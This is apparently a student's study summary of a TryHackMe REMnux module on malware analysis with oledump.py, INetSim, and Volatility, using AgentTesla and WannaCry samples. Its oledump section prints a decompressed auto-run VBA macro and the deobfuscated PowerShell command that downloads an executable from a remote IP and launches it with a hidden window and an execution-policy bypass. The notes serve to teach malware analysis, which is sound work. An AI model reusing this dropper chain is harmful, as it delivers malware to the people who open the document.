# 🛡️ TryHackMe — Cybersecurity 101
## Module: REMnux | Study Summary
> **Keywords:** REMnux · Malware Analysis · oledump.py · OLE2 · VBA Macros · INetSim · Volatility · Memory Forensics · Dynamic Analysis · Static Analysis

---

## 📚 Table of Contents

1. [What is REMnux?](#1-what-is-remnux)
2. [Tool 1 — oledump.py: Static File Analysis](#2-tool-1--oledumppy-static-file-analysis)
3. [Tool 2 — INetSim: Fake Network Simulation](#3-tool-2--inetsim-fake-network-simulation)
4. [Tool 3 — Volatility: Memory Investigation](#4-tool-3--volatility-memory-investigation)
5. [Tool 4 — strings: String Extraction](#5-tool-4--strings-string-extraction)
6. [Preprocessing Evidence — Bulk Workflow](#6-preprocessing-evidence--bulk-workflow)
7. [Quick Reference Cheatsheet](#7-quick-reference-cheatsheet)
8. [Key Terminology](#8-key-terminology)
9. [My Notes & Questions](#9-my-notes--questions)

---

## 1. What is REMnux?

**REMnux** is a Linux distribution purpose-built for **reverse engineering and malware analysis**. It comes pre-loaded with a curated collection of tools for analyzing:

- Potentially malicious programs and scripts
- Suspicious documents and files (OLE2, PDF, Office macros)
- Memory captures (RAM forensics)
- Network behavior (simulated environments)

> In other words: REMnux is the analyst's workbench — one VM that has everything needed to dissect malware without risking infection of production systems.

---

## 2. Tool 1 — oledump.py: Static File Analysis

### What is oledump.py?

`oledump.py` is a Python tool that analyzes **OLE2 files** (Object Linking and Embedding — also called Structured Storage or Compound File Binary Format). OLE2 is the underlying format for Microsoft Office documents (`.doc`, `.xls`, `.xlsm`, `.docm`, etc.), making it the primary tool for hunting embedded macros in Office files.

> In other words: When you receive a suspicious Excel or Word file, oledump.py lets you peek inside and see if there's a hidden VBA macro payload — without opening the file.

### Target file in lab: `agenttesla.xlsm`

**Location:** `/home/ubuntu/Desktop/tasks/agenttesla/`

---

### Step 1 — Initial Scan

```bash
oledump.py agenttesla.xlsm
```

**Output:**
```
A: xl/vbaProject.bin
A1:  468  'PROJECT'
A2:   62  'PROJECTwm'
A3: m 169  'VBA/Sheet1'
A4: M 688  'VBA/ThisWorkbook'
A5:    7  'VBA/_VBA_PROJECT'
A6:  209  'VBA/dir'
```

### Understanding the Output

| Element | Meaning |
|---|---|
| `A` (index) | The OLE2 container found in the file |
| `A1`, `A2`... | Data streams within the container |
| `m` (lowercase) | Data stream contains a **macro** (compressed, smaller) |
| `M` (uppercase) | Data stream contains a **macro** — ⚠️ **INVESTIGATE THIS** |
| Number (e.g. 688) | Size of the data stream in bytes |

> ⚠️ **Key rule:** A capital `M` next to a data stream = macro present. Always investigate streams marked `M` first.

In this case: **A4 (VBA/ThisWorkbook)** has `M` — this is our target.

---

### Step 2 — Inspect the Data Stream (Hex Dump)

```bash
oledump.py agenttesla.xlsm -s 4
```

| Parameter | Meaning |
|---|---|
| `-s` | Select / inspect a specific data stream |
| `4` | The stream number (A4 in this case) |

Output is in **hex dump format** — readable but challenging.

---

### Step 3 — Decompress & Deobfuscate the VBA (Human-Readable)

```bash
oledump.py agenttesla.xlsm -s 4 --vbadecompress
```

`--vbadecompress` automatically decompresses any compressed VBA macros into a readable format.

**Decompressed output (relevant section):**

```vba
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* ... "
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```

**What this shows:**
- `Workbook_Open()` — macro runs **automatically when the file is opened**
- `Sqtnew` — a heavily obfuscated string (uses `*` and `^` as noise characters)
- `Replace(Sqtnew, "*", "")` — strips out the `*` characters
- `Replace(Sqtnew, "^", "")` — strips out the `^` characters
- `WScript.Shell + Exec` — executes the resulting string as a shell command

---

### Step 4 — Deobfuscate the Payload with CyberChef

1. Copy the value of `Sqtnew` (the obfuscated string)
2. Open **CyberChef**: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
3. Add **Find/Replace** operation → find `*` → replace with nothing (SIMPLE STRING)
4. Add **Find/Replace** operation → find `^` → replace with nothing (SIMPLE STRING)

**Cleaned result:**

```powershell
powershell -WindowStyle hidden -executionpolicy bypass;
$TempFile = [IO.Path]::GetTempFileName() |
Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru;
Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe" -OutFile $TempFile;
Start-Process $TempFile;
```

### PowerShell Payload Breakdown

| Command | Purpose |
|---|---|
| `-WindowStyle hidden` | Runs PowerShell with **no visible window** |
| `-executionpolicy bypass` | Overrides execution policy to allow unsigned scripts |
| `[IO.Path]::GetTempFileName()` | Creates a temp file |
| `Rename-Item ... -replace 'tmp$', 'exe'` | Renames temp file from `.tmp` to `.exe` |
| `Invoke-WebRequest -Uri "..."` | **Downloads** `Doc-3737122pdf.exe` from the attacker's server |
| `-OutFile $TempFile` | Saves the downloaded file to the temp path |
| `Start-Process $TempFile` | **Executes** the downloaded malware |

> **Attack chain summary:** User opens `agenttesla.xlsm` → VBA macro auto-runs → PowerShell downloads `Doc-3737122pdf.exe` from `http://193.203.203.67/rt/` → Executes the downloaded payload. Classic **macro dropper** / **downloader** behavior.

---

### Scanning Another File

```bash
# Scan possible_malicious.docx
oledump.py /home/ubuntu/Desktop/tasks/agenttesla/possible_malicious.docx
```

---

## 3. Tool 2 — INetSim: Fake Network Simulation

### What is INetSim?

**INetSim (Internet Services Simulation Suite)** simulates a real network environment inside the REMnux VM. During **dynamic analysis**, malware often tries to reach out to C2 servers, download secondary payloads, or check for internet connectivity. INetSim intercepts these requests and fakes responses — allowing analysts to observe network behavior safely.

> In other words: INetSim is a "fake internet inside a box." Malware thinks it's reaching the real internet, but it's talking to your REMnux VM. You capture everything it tries to do.

### Lab Setup — Two VMs Required

| VM | Role |
|---|---|
| **REMnux VM** | Runs INetSim (acts as the fake internet/server) |
| **AttackBox** | Simulates the infected machine making network requests |

---

### Configuration Steps (REMnux)

```bash
# Step 1: Check REMnux machine IP
ifconfig        # Note the IP shown after ubuntu@

# Step 2: Edit INetSim config
sudo nano /etc/inetsim/inetsim.conf

# Find this line:
#dns_default_ip 0.0.0.0

# Change to (remove # and set your IP):
dns_default_ip MACHINE_IP

# Save: Ctrl+O, Enter, Ctrl+X

# Step 3: Verify the change
cat /etc/inetsim/inetsim.conf | grep dns_default_ip

# Step 4: Start INetSim
sudo inetsim
```

**Expected output when running:**
```
=== INetSim main process started (PID XXXX) ===
* dns_53_tcp_udp - started
* https_443_tcp - started
* ftp_21_tcp - started
...
Simulation running.
```

> Note: `http_80_tcp - failed!` is expected and can be ignored.

---

### Simulating Malware Download Behavior (AttackBox)

```bash
# From AttackBox — simulate malware downloading a secondary payload
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate

# Download the lab flag
sudo wget https://MACHINE_IP/flag.txt --no-check-certificate
```

> All downloaded files are **fake** — INetSim serves generic placeholder files.

---

### INetSim Connection Report

After stopping INetSim (`Ctrl+C`), a **report is automatically generated**:

```bash
# Reports saved to:
/var/log/inetsim/report/report.XXXX.txt

# Read the report:
sudo cat /var/log/inetsim/report/report.2594.txt
```

**Sample report output:**
```
=== Report for session '2594' ===
Real start date : 2024-09-22 21:04:42
...
2024-09-22 21:18:37 HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.ps1
2024-09-22 21:18:49 HTTPS connection, method: GET, URL: https://MACHINE_IP/second_payload.zip
===
```

**Report captures:**
- Protocol used (HTTPS, HTTP, FTP, etc.)
- HTTP method (GET, POST)
- Full URL requested
- Fake file served in response

---

## 4. Tool 3 — Volatility: Memory Investigation

### What is Volatility?

**Volatility** is the industry-standard framework for **memory forensics** — analyzing RAM captures (memory images) to investigate what was happening on a system at a specific moment in time. This is critical in incident response, as processes, network connections, and injected code in memory may not exist on disk.

> In other words: Volatility lets you freeze-frame a running system and inspect everything that was in memory — including malware that only lives in RAM and never touches the disk.

### Lab file: `wcry.mem` (WannaCry memory image)

**Location:** `/home/ubuntu/Desktop/tasks/Wcry_memory_image/`

> ⚠️ First: `sudo su` (run as root before using vol3)

---

### Core Volatility 3 Plugins (Windows)

#### PsTree — Process Tree

Lists processes in a **tree** based on parent process ID (PPID). Shows parent-child relationships.

```bash
vol3 -f wcry.mem windows.pstree.PsTree
```

**Notable output from WannaCry:**
```
1636   1608  explorer.exe
* 1940  1636  tasksche.exe          ← WannaCry scheduler
** 740  1940  @WanaDecryptor@       ← WannaCry ransomware decryptor UI
```

---

#### PsList — Process List

Lists all **currently active processes** (running at time of capture).

```bash
vol3 -f wcry.mem windows.pslist.PsList
```

> Difference from PsTree: PsList is flat (no tree structure), PsTree shows hierarchy.

---

#### CmdLine — Command Line Arguments

Lists **command line arguments** for each process — shows exactly how each process was launched.

```bash
vol3 -f wcry.mem windows.cmdline.CmdLine
```

**Notable output:**
```
1940  tasksche.exe   "C:\Intel\ivecuqmanpnirkt615\tasksche.exe"
740   @WanaDecryptor@  @WanaDecryptor@.exe
```

> The unusual path `C:\Intel\ivecuqmanpnirkt615\` is a red flag — WannaCry drops itself here.

---

#### FileScan — File Objects Scan

Scans memory for **file objects** — reveals files that were open/accessed, even if deleted from disk.

```bash
vol3 -f wcry.mem windows.filescan.FileScan
```

> Results can have 1,400+ lines. Look for `.wnry` files, unusual executables, or files in strange paths.

---

#### DllList — Loaded DLL List

Lists all **DLLs loaded** by each process in memory.

```bash
vol3 -f wcry.mem windows.dlllist.DllList
```

> Useful for spotting injected DLLs or suspicious libraries loaded by legitimate processes.

---

#### Malfind — Injected Code Detection

Lists **memory regions that potentially contain injected code** — looks for executable memory with suspicious characteristics (no mapped file, RWX permissions, PE headers in unexpected locations).

```bash
vol3 -f wcry.mem windows.malfind.Malfind
```

**Processes flagged in WannaCry memory:**
1. `csrss.exe` (first result)
2. `winlogon.exe` (second result)

> These are normally legitimate Windows processes — injected code in them is highly suspicious.

---

#### PsScan — Process Scan

Scans memory for process structures — can find **hidden or terminated processes** that don't appear in PsList.

```bash
vol3 -f wcry.mem windows.psscan.PsScan
```

> Key difference from PsList: PsScan uses a different detection method and can surface processes that malware tried to hide.

---

### Volatility Plugin Reference Table

| Plugin | Command | What it shows |
|---|---|---|
| PsTree | `windows.pstree.PsTree` | Process hierarchy (parent-child tree) |
| PsList | `windows.pslist.PsList` | All active processes (flat list) |
| CmdLine | `windows.cmdline.CmdLine` | Command line arguments per process |
| FileScan | `windows.filescan.FileScan` | File objects in memory (open/accessed files) |
| DllList | `windows.dlllist.DllList` | Loaded DLLs per process |
| Malfind | `windows.malfind.Malfind` | Memory regions with potentially injected code |
| PsScan | `windows.psscan.PsScan` | Process scan — finds hidden/terminated processes |

---

## 5. Tool 4 — strings: String Extraction

The Linux `strings` utility extracts **printable text strings** from binary files. Applied to memory images, it can reveal URLs, file paths, commands, registry keys, and other artifacts.

```bash
# Extract ASCII strings
strings wcry.mem > wcry.strings.ascii.txt

# Extract 16-bit little-endian strings (common in Windows binaries)
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt

# Extract 16-bit big-endian strings
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

| Command | String Type | Use Case |
|---|---|---|
| `strings` (default) | ASCII (7-bit) | Most readable — finds URLs, paths, commands |
| `strings -e l` | 16-bit little-endian | Common in Windows — finds Unicode strings |
| `strings -e b` | 16-bit big-endian | Less common — alternative encoding |

> All three formats should be extracted during preprocessing — they each capture different artifacts.

---

## 6. Preprocessing Evidence — Bulk Workflow

**Evidence preprocessing** means running analysis tools ahead of time and saving results to text files, so any analyst can quickly search and investigate without re-running slow tools.

### Bulk Volatility Run (Loop Statement)

```bash
# Navigate to the memory image directory as root
sudo su
cd /home/ubuntu/Desktop/tasks/Wcry_memory_image/

# Run all plugins in a loop — output each to a separate text file
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done
```

| Flag | Meaning |
|---|---|
| `-q` | Quiet mode — suppresses progress bars in terminal |
| `-f wcry.mem` | Read from this memory image |
| `> wcry.$plugin.txt` | Write output to a file named after the plugin |

**Output files generated:**
- `wcry.windows.malfind.Malfind.txt`
- `wcry.windows.psscan.PsScan.txt`
- `wcry.windows.pstree.PsTree.txt`
- `wcry.windows.pslist.PsList.txt`
- `wcry.windows.cmdline.CmdLine.txt`
- `wcry.windows.filescan.FileScan.txt`
- `wcry.windows.dlllist.DllList.txt`

### Complete Preprocessing Workflow

```bash
# 1. Volatility plugins (bulk)
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
  vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt
done

# 2. String extraction (three encodings)
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt
```

> **Why preprocess?** Memory analysis tools are slow. Saving results to text files lets analysts `grep`, `cat`, and search without re-running the tools. This is standard practice in digital forensics.

---

## 7. Quick Reference Cheatsheet

### oledump.py

```bash
# List data streams in an OLE2 file
oledump.py file.xlsm

# Inspect a specific data stream (hex dump)
oledump.py file.xlsm -s 4

# Decompress and display VBA macro in readable form
oledump.py file.xlsm -s 4 --vbadecompress
```

**oledump indicators:**
- `M` next to stream → contains a macro → investigate
- `m` next to stream → smaller macro → may still be relevant

### INetSim

```bash
# Configure
sudo nano /etc/inetsim/inetsim.conf    # Set dns_default_ip = MACHINE_IP

# Start
sudo inetsim

# View report (after stopping)
sudo cat /var/log/inetsim/report/report.XXXX.txt
```

### Volatility 3

```bash
# Single plugin
vol3 -f memory.mem windows.pstree.PsTree

# Quiet mode (no progress bar)
vol3 -q -f memory.mem windows.pslist.PsList

# Bulk preprocessing loop
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do
  vol3 -q -f memory.mem $plugin > output.$plugin.txt
done
```

### strings

```bash
strings file.mem > output.ascii.txt
strings -e l file.mem > output.unicode_le.txt
strings -e b file.mem > output.unicode_be.txt
```

---

## 8. Key Terminology

| Term | Definition |
|---|---|
| **REMnux** | Linux distribution purpose-built for malware analysis and reverse engineering |
| **OLE2** | Object Linking and Embedding v2 — the binary format underlying MS Office files |
| **oledump.py** | Python tool for analyzing OLE2 files and extracting embedded macros |
| **Data Stream** | A component inside an OLE2 file container |
| **VBA Macro** | Visual Basic for Applications code embedded in Office documents — common malware vector |
| **VBA Decompress** | The `--vbadecompress` flag that makes compressed VBA macros human-readable |
| **INetSim** | Internet Services Simulation Suite — fakes network services for safe dynamic analysis |
| **Dynamic Analysis** | Analyzing malware by executing it (in a safe/controlled environment) |
| **Static Analysis** | Analyzing malware without executing it |
| **Volatility** | Industry-standard framework for memory forensics (RAM analysis) |
| **Memory Image** | A capture/dump of a system's RAM at a specific moment in time |
| **PsTree** | Volatility plugin listing processes as a parent-child hierarchy |
| **PsList** | Volatility plugin listing all active processes |
| **Malfind** | Volatility plugin identifying memory regions with potentially injected code |
| **PsScan** | Volatility plugin scanning for hidden/terminated processes |
| **strings** | Linux utility that extracts printable text from binary files |
| **Preprocessing** | Running analysis tools ahead of time and saving output for faster investigation |
| **Invoke-WebRequest** | PowerShell command commonly used to download files from the internet |
| **-WindowStyle hidden** | PowerShell flag that hides the console window from the user |
| **-executionpolicy bypass** | Overrides PowerShell's script execution restrictions |
| **WScript.Shell + Exec** | VBA method for executing shell commands from within an Office macro |
| **Macro Dropper** | Malware that uses an Office macro to download and execute a secondary payload |

---

## 📝 My Notes & Questions

> *[ Write your questions, insights, and connections to other concepts here ]*

---

*TryHackMe — Cybersecurity 101 | REMnux*
